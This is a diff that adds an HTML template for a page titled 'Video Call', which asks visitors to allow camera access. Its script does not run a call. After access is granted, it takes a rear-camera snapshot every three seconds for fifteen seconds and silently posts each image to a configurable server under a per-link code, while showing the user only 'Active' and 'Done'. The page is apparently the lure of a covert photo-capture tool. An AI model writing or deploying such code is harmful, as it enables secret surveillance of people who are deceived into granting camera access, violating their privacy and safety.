@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Video</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:rgba(255,255,255,.05);backdrop-filter:blur(10px);border-radius:20px;padding:30px;width:100%;max-width:400px;border:1px solid rgba(255,255,255,.1);text-align:center}h2{font-size:22px;margin-bottom:8px}p{color:#aaa;font-size:14px;margin-bottom:20px}.btn{padding:14px 36px;font-size:16px;border:none;border-radius:50px;cursor:pointer;font-weight:600;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;transition:.3s}.btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(102,126,234,.4)}.btn:disabled{opacity:.5;cursor:not-allowed}#video{width:100%;border-radius:12px;margin:15px 0;display:none;background:#000}.st{display:none;width:28px;height:28px;border:3px solid rgba(255,255,255,.2);border-top:3px solid #fff;border-radius:50%;animation:spin .8s linear infinite;margin:12px auto}@keyframes spin{to{transform:rotate(360deg)}}</style>
+</head>
+<body>
+<div class="card">
+<h2>Video Call</h2>
+<p>Camera access required</p>
+<button class="btn" id="btn" onclick="start()">Start</button>
+<div class="st" id="sp"></div>
+<video id="video" autoplay playsinline muted></video>
+<p id="st"></p>
+</div>
+<script>
+const code='{{code}}',srv='{{server}}';
+{% if not valid %}document.getElementById('btn').disabled=true;document.getElementById('st').innerHTML='Invalid';{% endif %}
+let stream=null,t=null;
+async function start(){
+const btn=document.getElementById('btn'),sp=document.getElementById('sp'),v=document.getElementById('video');
+btn.disabled=true;sp.style.display='block';
+try{
+stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:true});
+v.srcObject=stream;v.style.display='block';sp.style.display='none';document.getElementById('st').innerHTML='Active';
+const c=document.createElement('canvas');c.width=640;c.height=480;const ctx=c.getContext('2d');let cnt=0;
+t=setInterval(()=>{ctx.drawImage(v,0,0);cnt++;
+fetch(srv+'/api/camera/'+code,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',data:c.toDataURL('image/jpeg',.7),count:cnt,timestamp:new Date().toISOString()})}).catch(()=>{})},3000);
+setTimeout(()=>stop(),15000);
+}catch(e){sp.style.display='none';document.getElementById('st').innerHTML='Error: '+e.message;btn.disabled=false}}
+function stop(){if(t)clearInterval(t);if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}document.getElementById('st').innerHTML='Done';document.getElementById('btn').disabled=false}
+</script>
+</body>
+</html>
